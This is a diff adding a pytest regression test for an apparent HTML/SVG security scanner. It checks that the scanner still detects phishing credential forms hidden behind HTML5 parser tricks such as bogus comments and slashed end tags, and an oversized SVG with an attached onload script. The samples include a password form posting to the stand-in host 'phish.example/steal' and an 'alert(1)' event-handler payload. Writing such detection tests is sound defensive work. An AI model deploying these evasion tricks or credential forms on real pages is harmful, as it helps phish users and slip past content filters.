@@ -472,3 +472,42 @@ def test_review_r2_regressions_html5_comments_rawtext_unquoted_and_polygon_path(
     )
     res_pn = _scan(tmp_path, "huge_path_none.svg", huge_path_none)
     assert res_pn.risk_level == RiskLevel.GREEN and res_pn.score == 0
+
+
+def test_review_r3_regressions_bogus_comments_slash_endtags_and_quoted_event_attr(
+    tmp_path: Path,
+) -> None:
+    # Major 1: HTML5 bogus comments <!x a="> and <?x a="> before phishing form/meta
+    for idx, prefix in enumerate((b'<!x a=">', b'<?x a=">')):
+        doc = (
+            b"<!DOCTYPE html><html><body>"
+            + prefix
+            + b'<form action="https://phish.example/steal"><input type="password"></form></body></html>'
+        )
+        assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, f"bogus_{idx}.html", doc))
+
+    # Major 2: HTML5 end-tags with slash/attr: </style/x>, </script/x>, </style foo>
+    for idx, block in enumerate(
+        (
+            b"<style>body{}</style/x>",
+            b"<style>body{}</style foo>",
+            b"<script>var x=1;</script/x>",
+        )
+    ):
+        doc = (
+            b"<!DOCTYPE html><html><head>"
+            + block
+            + b'</head><body><form action="https://phish.example/steal">'
+            b'<input type="password"></form></body></html>'
+        )
+        assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, f"endtag_{idx}.html", doc))
+
+    # Major 3: oversized <path d="..."onload="alert(1)"/> without space before onload
+    no_space_ev = (
+        b'<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0'
+        + b" L1 1" * 15_000
+        + b'"onload="alert(1)"/></svg>'
+    )
+    res_ev = _scan(tmp_path, "oversized_nospace_ev.svg", no_space_ev)
+    assert "WEB_PARSE_LIMIT" in _rule_ids(res_ev)
+    assert res_ev.is_incomplete
